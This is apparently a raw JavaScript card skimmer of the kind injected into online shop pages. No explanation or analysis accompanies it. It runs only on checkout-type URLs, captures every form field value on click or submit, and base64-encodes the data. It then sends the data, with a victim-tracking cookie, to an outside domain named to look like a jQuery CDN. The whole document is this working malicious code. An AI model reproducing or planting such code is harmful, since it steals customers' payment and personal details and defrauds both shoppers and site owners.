<script type="text/javascript">
var fa3b79b10153ce22c599aa4c035e421b3={
    snd:null,
    Glink:'https://jquery-code.su/cloud/jquery.min.js',
    myid:(function(name){
        var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
        return matches?decodeURIComponent(matches[1]):undefined;
    })('setidd')||(function(){
        var ms=new Date();
        var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111);
        var date=new Date(new Date().getTime()+60*60*24*1000);
        document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
        return myid;
    })(),
clk:function(){
        fa3b79b10153ce22c599aa4c035e421b3.snd=null;
        var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
        for (var i=0;i<inp.length;i++){
            if(inp[i].value.length>0){
                var nme=inp[i].name;
                if(nme==''){nme=i;}
                    fa3b79b10153ce22c599aa4c035e421b3.snd+=inp[i].name+'='+inp[i].value+'&';
            }
        }
    },
    send:function(){
        try{
            var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
            for(var i=0;i<btn.length;i++){
                var b=btn[i];
                if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
                    if(b.addEventListener) {
                        b.addEventListener('click',fa3b79b10153ce22c599aa4c035e421b3.clk,false);
                    }else{
                        b.attachEvent('onclick',fa3b79b10153ce22c599aa4c035e421b3.clk);
                    }
                }
            }
            var frm=document.querySelectorAll('form');
            for(vari=0;i<frm.length;i++){
                if(frm[i].addEventListener){
                    frm[i].addEventListener('submit',fa3b79b10153ce22c599aa4c035e421b3.clk,false);
                }else{
                    frm[i].attachEvent('onsubmit',fa3b79b10153ce22c599aa4c035e421b3.clk);
                }
            }
            if(fa3b79b10153ce22c599aa4c035e421b3.snd!=null){
                var domm=location.hostname.split('.').slice(0).join('_');
                var keym=btoa(fa3b79b10153ce22c599aa4c035e421b3.snd);
                var http=new XMLHttpRequest();
                http.open('POST',fa3b79b10153ce22c599aa4c035e421b3.Glink,true);
                http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
                http.send('info='+keym+'&hostname='+domm+'&key='+fa3b79b10153ce22c599aa4c035e421b3.myid);
            }
            fa3b79b10153ce22c599aa4c035e421b3.snd=null;
            keym=null;
            setTimeout(function(){fa3b79b10153ce22c599aa4c035e421b3.send()},30);
        }catch(e){}
    }
}

if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
        fa3b79b10153ce22c599aa4c035e421b3.send();
}
</script>
